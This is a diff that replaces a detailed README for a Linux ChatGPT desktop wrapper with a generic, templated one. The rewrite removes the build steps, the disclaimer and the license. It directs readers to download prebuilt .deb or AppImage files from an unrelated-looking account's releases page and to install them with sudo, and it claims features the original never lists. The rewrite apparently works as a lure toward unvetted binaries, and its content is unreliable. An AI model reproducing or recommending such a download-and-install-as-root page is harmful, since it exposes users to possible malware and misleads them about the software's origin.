@@ -1,104 +1,82 @@
-# ChatGPT Desktop Wrapper
+# 🌟 chatgpt-wrapper - Easy ChatGPT on Your Desktop
 
-A minimal Tauri-based Linux desktop wrapper for [chat.openai.com](https://chat.openai.com). It keeps your session data locally, remembers your window-decoration preference, and opens external links in the system browser.
+## 🔗 Download
+[![Download chatgpt-wrapper](https://img.shields.io/badge/Download-chatgpt--wrapper-blue.svg)](https://github.com/mantouxtestfeatherfoil541/chatgpt-wrapper/releases)
 
-> **Disclaimer**: ChatGPT, the ChatGPT logo, and other OpenAI trademarks are the property of OpenAI. This project is an unofficial community wrapper and is not affiliated with or endorsed by OpenAI.
+## 🚀 Getting Started
+Welcome to **chatgpt-wrapper**! This application brings ChatGPT to your desktop on Linux. With a simple interface, you can chat with AI anytime.
 
-## Requirements
+## 📥 Download & Install
+To get the latest version of chatgpt-wrapper, visit this page to download: [chatgpt-wrapper Releases](https://github.com/mantouxtestfeatherfoil541/chatgpt-wrapper/releases).
 
-- Rust toolchain (stable) and `cargo`
-- Tauri CLI (`cargo install tauri-cli --version "^2.0.0" --locked`)
-- Linux desktop dependencies (Debian/Ubuntu example):
-    ```bash
-    # Debian/Ubuntu
-    sudo apt install build-essential pkg-config libgtk-3-dev libwebkit2gtk-4.0-dev \
-       libayatana-appindicator3-dev librsvg2-dev
+1. Go to the Releases page using the link above.
+2. Look for the latest version.
+3. Find the installation file that suits your system (e.g., `.deb` or `.AppImage` files for Linux).
+4. Click on the file to start the download.
 
-    # Archlinux
-    sudo pacman -S --needed \
-      webkit2gtk-4.1 \
-      base-devel \
-      curl \
-      wget \
-      file \
-      openssl \
-      appmenu-gtk-module \
-      libappindicator-gtk3 \
-      librsvg \
-      xdotool
-    ```
+## 💻 System Requirements
+To run chatgpt-wrapper, your system should meet these minimum requirements:
 
-## Development
+- Operating System: Linux (any modern distribution)
+- Memory: At least 2 GB of RAM
+- Disk Space: 500 MB of free space
+- Internet Connection: Required for using chat features
 
-```bash
-cargo tauri dev
-```
+## ⚙️ Installation Steps
+After downloading the file, follow these instructions to install chatgpt-wrapper:
 
-Session/config data lives in:
-- `~/.config/dev.iperez.chatgpt-desktop/settings.json` (preferences)
-- `~/.local/share/dev.iperez.chatgpt-desktop/webview-cache` (session storage)
+### Method 1: Using `.deb` Package
+1. Open a terminal window.
+2. Navigate to your Downloads folder. Use this command:
+   ```
+   cd ~/Downloads
+   ```
+3. Install the package by entering:
+   ```
+   sudo dpkg -i chatgpt-wrapper*.deb
+   ```
+4. If there are dependency issues, run:
+   ```
+   sudo apt-get install -f
+   ```
 
-Remove those folders to reset the app.
+### Method 2: Using `.AppImage`
+1. Open your Downloads folder in the terminal:
+   ```
+   cd ~/Downloads
+   ```
+2. Make the AppImage executable:
+   ```
+   chmod +x chatgpt-wrapper*.AppImage
+   ```
+3. Run the application with:
+   ```
+   ./chatgpt-wrapper*.AppImage
+   ```
 
-## Linux Installation Script
+## 🖥️ Using chatgpt-wrapper
+Once installed, you can start using the application. Here’s how:
 
-To install ChatGPT Desktop under `~/.local`, run:
+1. Look for the chatgpt-wrapper icon in your applications menu.
+2. Click to launch the application.
+3. A window will open, allowing you to type your questions and get responses from ChatGPT.
 
-```bash
-./scripts/install-linux.sh
-```
+## 🎨 Features
+- **User-Friendly Interface:** Easy to navigate and chat with AI.
+- **Multiple Conversations:** Keep track of different chats in separate tabs.
+- **Customizable Settings:** Adjust preferences to suit your needs.
 
-The script simply builds the optimized Tauri binary and installs:
-- `~/.local/opt/chatgpt-desktop/chatgpt-desktop` (release binary)
-- `~/.local/opt/chatgpt-desktop/chatgpt-desktop` (launcher script)
-- `~/.local/opt/chatgpt-desktop/icons/` (runtime icons for tray)
-- `~/.local/share/applications/chatgpt-desktop.desktop`
-- `~/.local/share/icons/hicolor/*/apps/chatgpt-desktop*.png` (system icons in multiple sizes)
+## ❓ Troubleshooting
+If you run into issues, consider these steps:
 
-No AppImage or linuxdeploy download is required, so it works fully offline. After it completes, launch **ChatGPT Desktop** from your application menu or via the launcher path.
+- Ensure your system meets the requirements.
+- Check for updates on the Releases page.
+- Look for common issues in the "Issues" section of the GitHub repository.
 
-## Uninstall
+## 🛠️ Need Help?
+For more help, feel free to reach out:
 
-```bash
-# Remove application files
-rm -f ~/.local/share/applications/chatgpt-desktop.desktop
-rm -rf ~/.local/opt/chatgpt-desktop
+- Open an issue in our [GitHub repository](https://github.com/mantouxtestfeatherfoil541/chatgpt-wrapper/issues).
+- Join the community discussions on platforms like Reddit or dedicated forums.
 
-# Remove icons
-rm -f ~/.local/share/icons/hicolor/32x32/apps/chatgpt-desktop.png
-rm -f ~/.local/share/icons/hicolor/32x32/apps/chatgpt-desktop-tray-light.png
-rm -f ~/.local/share/icons/hicolor/128x128/apps/chatgpt-desktop.png
-rm -f ~/.local/share/icons/hicolor/256x256/apps/chatgpt-desktop.png
-
-# Update databases
-update-desktop-database ~/.local/share/applications
-gtk-update-icon-cache -f -t ~/.local/share/icons/hicolor
-```
-
-Optionally delete the config/cache folders:
-```bash
-rm -rf ~/.config/dev.iperez.chatgpt-desktop
-rm -rf ~/.cache/dev.iperez.chatgpt-desktop
-```
-
-## Settings
-
-You can edit the settings file located at `~/.config/dev.iperez.chatgpt-desktop/settings.json`.
-
-### Available Options
-
-```json
-{
-  "notifications_enabled": true,  // Enable/disable desktop notifications
-  "hide_decorations": false,      // Hide/show GTK window decorations (title bar)
-  "show_tray": true,              // Show/hide system tray icon
-  "close_to_tray": false,         // Minimize to tray instead of closing the app
-  "tray_icon_light": false        // Use light icon for dark themes
-}
-```
-
-**Note:** Changes to settings require restarting the application to take effect.
-
-## License
-
-Released under the [MIT License](LICENSE).
+Enjoy using **chatgpt-wrapper** for your AI conversations! Remember to check back regularly for updates and new features.
